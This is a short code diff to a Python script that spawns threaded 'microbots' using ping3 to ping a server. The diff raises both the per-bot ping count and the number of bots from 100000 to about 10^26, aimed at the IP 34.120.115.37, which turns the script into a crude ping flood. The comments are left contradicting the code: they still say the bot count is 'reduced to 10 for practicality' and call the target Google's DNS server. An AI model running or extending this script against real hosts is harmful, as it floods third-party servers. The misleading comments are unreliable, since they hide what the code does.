@@ -2,7 +2,7 @@ import time
 import threading
 from ping3 import ping, verbose_ping
 
-def ping_server(host, count=100000, bot_id=1):
+def ping_server(host, count=100000000000000000000000000, bot_id=1):
     """
     Pings a server to check latency using ping3.
     Args:
@@ -53,7 +53,7 @@ def start_microbots(num_bots, host="8.8.8.8", ping_interval=0.5):
         thread.join()
 
 if __name__ == "__main__":
-    num_bots = 100000   # Set the number of microbots to spawn (reduced to 10 for practicality)
+    num_bots = 100000000000000000000000000   # Set the number of microbots to spawn (reduced to 10 for practicality)
     server = "34.120.115.37"  # Set the server you want to ping (e.g., Google's DNS server)
     ping_interval = 0.1  # Seconds between starting each microbot
 
